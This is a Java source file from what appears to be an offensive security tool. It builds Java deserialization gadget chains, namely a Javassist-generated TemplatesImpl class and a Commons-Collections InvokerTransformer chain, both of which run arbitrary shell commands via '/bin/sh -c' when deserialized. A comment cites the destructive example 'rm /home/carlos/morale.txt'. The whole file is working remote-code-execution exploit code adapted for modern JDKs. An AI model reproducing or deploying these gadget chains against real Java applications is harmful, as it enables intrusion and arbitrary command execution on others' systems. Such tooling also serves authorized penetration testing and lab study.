package com.omnistrike.modules.injection.deser;

import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

/**
 * Gadget chain construction utilities.
 * Builds TemplatesImpl payloads via Javassist and InvokerTransformer chains.
 *
 * After ReflectionUtils opens JDK modules via Unsafe+IMPL_LOOKUP,
 * Javassist can access internal classes normally.
 */
public final class GadgetUtils {

    private GadgetUtils() {}

    private static final String TEMPLATES_IMPL = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
    private static final String ABSTRACT_TRANSLET = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
    private static final String TRANSFORMER_FACTORY_IMPL = "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl";

    /**
     * Create a TemplatesImpl instance with evil bytecodes that execute a command.
     *
     * Modules are opened by ReflectionUtils static init, so Javassist source
     * compilation and direct Class.forName both work on JDK 17+.
     */
    public static Object createTemplatesImpl(String command) throws Exception {
        // Ensure modules are opened (triggers ReflectionUtils static init)
        ReflectionUtils.getUnsafe();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName(ABSTRACT_TRANSLET)));

        CtClass cc = pool.makeClass("Pwner" + System.nanoTime());
        cc.setSuperclass(pool.get(ABSTRACT_TRANSLET));

        // Static initializer: Runtime.getRuntime().exec(cmd) via /bin/sh -c
        // Must use shell wrapper — exec(String[]) treats single string as executable name,
        // not a shell command. Without /bin/sh -c, "rm /home/carlos/morale.txt" would fail.
        String escaped = command.replace("\\", "\\\\").replace("\"", "\\\"");
        cc.makeClassInitializer().insertAfter(
                "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \"" + escaped + "\"});");

        // Implement required abstract methods (empty bodies)
        cc.addMethod(CtMethod.make(
                "public void transform(" +
                "com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) " +
                "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", cc));
        cc.addMethod(CtMethod.make(
                "public void transform(" +
                "com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, " +
                "com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) " +
                "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", cc));

        byte[] classBytes = cc.toBytecode();
        cc.detach();

        // Construct TemplatesImpl via Unsafe — no constructor needed
        Class<?> tplClass = Class.forName(TEMPLATES_IMPL);
        Object templates = ReflectionUtils.createWithoutConstructor(tplClass);
        ReflectionUtils.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        ReflectionUtils.setFieldValue(templates, "_name", "Pwner" + System.nanoTime());
        // Must use real constructor — TransformerFactoryImpl() initializes _externalExtensionsMap
        // which is needed when TrAXFilter calls newTransformer() → defineTransletClasses()
        ReflectionUtils.setFieldValue(templates, "_tfactory",
                Class.forName(TRANSFORMER_FACTORY_IMPL).getDeclaredConstructor().newInstance());

        return templates;
    }

    /**
     * Build the classic CC3 InvokerTransformer chain.
     */
    public static Transformer[] makeTransformerChain(String command) {
        // Use exec(String[]) with /bin/sh -c to support pipes, redirects, spaces in paths
        String[] execArgs = new String[]{"/bin/sh", "-c", command};
        return new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String[].class},
                        new Object[]{execArgs}),
                new ConstantTransformer(1)
        };
    }

    /**
     * Create an inert ChainedTransformer (ConstantTransformer(1)) for deferred arming.
     */
    public static ChainedTransformer makeInertChain() {
        return new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
    }
}
